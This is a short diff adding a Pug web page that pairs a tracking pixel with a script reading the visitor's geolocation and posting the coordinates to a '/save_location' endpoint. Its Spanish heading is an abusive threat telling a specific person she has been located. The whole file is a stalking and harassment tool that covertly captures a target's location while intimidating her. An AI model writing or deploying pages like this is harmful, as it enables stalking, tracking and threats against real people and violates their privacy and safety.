@@ -1,0 +1,28 @@
+doctype html
+html
+  head
+    title Geolocation Example
+  body
+    h1 Te dije que iba localizarte Perra maldita
+    img#tracking_pixel(src='/tracking_pixel', alt='')
+
+    script.
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition((position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Enviar estos datos al servidor
+          fetch('/save_location', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({lat, lon})
+          }).then(res => res.json()).then(data => {
+            console.log(data);
+          });
+        });
+      } else {
+        console.log("Geolocation is not available");
+      }
